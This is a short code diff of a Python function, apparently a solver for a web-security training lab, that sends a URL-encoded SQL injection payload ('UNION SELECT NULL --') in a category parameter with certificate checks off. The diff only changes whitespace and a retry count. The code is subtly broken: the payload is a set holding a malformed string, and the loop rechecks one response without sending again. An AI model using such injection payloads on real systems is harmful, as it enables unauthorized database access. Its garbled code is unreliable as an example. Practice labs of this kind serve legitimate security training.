@@ -12,8 +12,8 @@ def sqli_exp(url):
     category = {"category':Pets'UNION SELECT NULL --"}
     encoded_payload = urllib.parse.quote_plus(category)
     r = requests.get(url + uri + encoded_payload, verify=False, proxies=proxies)
-
-    for _ in range(20):  
+ 
+    for _ in range(25)  :  
         if "Congratulations, you solved the lab!" in r.text:
             return True
         else:
